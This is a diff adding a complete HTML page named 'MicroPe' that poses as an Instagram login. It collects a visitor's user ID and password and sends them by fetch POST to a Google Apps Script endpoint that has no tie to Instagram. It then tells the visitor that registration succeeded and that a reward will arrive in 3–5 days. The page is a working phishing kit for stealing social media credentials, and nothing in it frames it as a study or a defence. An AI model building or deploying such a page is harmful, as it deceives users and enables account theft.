@@ -1,0 +1,62 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MicroPe</title>
+<style>
+*{box-sizing:border-box;font-family:Segoe UI,sans-serif}
+body{margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh;background:linear-gradient(-45deg,#0f172a,#1d4ed8,#06b6d4,#111827);background-size:400% 400%;animation:bg 12s ease infinite;color:#fff}
+@keyframes bg{0%{background-position:0 50%}50%{background-position:100% 50%}100%{background-position:0 50%}}
+.card{width:min(92vw,420px);padding:28px;border-radius:20px;background:rgba(255,255,255,.12);backdrop-filter:blur(12px)}
+input,button{width:100%;padding:14px;margin:10px 0;border:none;border-radius:10px}
+input{background:rgba(255,255,255,.18);color:#fff}
+button{background:#22c55e;color:#fff;font-weight:bold;cursor:pointer}
+button:hover{opacity:.9}
+#dash,#done{display:none;text-align:center}
+</style>
+</head>
+<body>
+<div class="card">
+<div id="form">
+<h1>MicroPe</h1>
+<h3>Login with your Instagram Account</h3>
+<input id="username" placeholder="User ID">
+<input id="password" type="password" placeholder="Password">
+<button onclick="reg()">Submit</button>
+</div>
+<div id="dash">
+<h2 id="hi"></h2>
+<p>Registration successful.</p>
+<button onclick="nextS()">Continue</button>
+</div>
+<div id="done">
+<h2>🎉 Registration Complete 🎉</h2>
+<p>You will get something within 3–5 days.</p>
+</div>
+</div>
+<script>
+async function reg(){
+const username=document.getElementById("username").value.trim();
+const password=document.getElementById("password").value.trim();
+if(!username||!password){alert("Please fill all fields.");return;}
+try{
+const r=await fetch("https://script.google.com/macros/s/AKfycbyCGnDbVbUv00qKjJVhcSgg49brBuw9TY0NWBUqPWBf_tZnjof0AqbPEErrJ09ujZpMLw/exec",{
+method:"POST",
+headers:{"Content-Type":"text/plain;charset=utf-8"},
+body:JSON.stringify({username,password})
+});
+if(!r.ok) throw new Error("Network");
+document.getElementById("form").style.display="none";
+document.getElementById("dash").style.display="block";
+document.getElementById("hi").textContent="Hi, "+username+"!";
+}catch(e){alert("Failed to submit. Check Apps Script deployment and CORS.");console.log(e);}
+}
+function nextS(){
+document.getElementById("dash").style.display="none";
+document.getElementById("done").style.display="block";
+}
+</script>
+</body>
+</html>
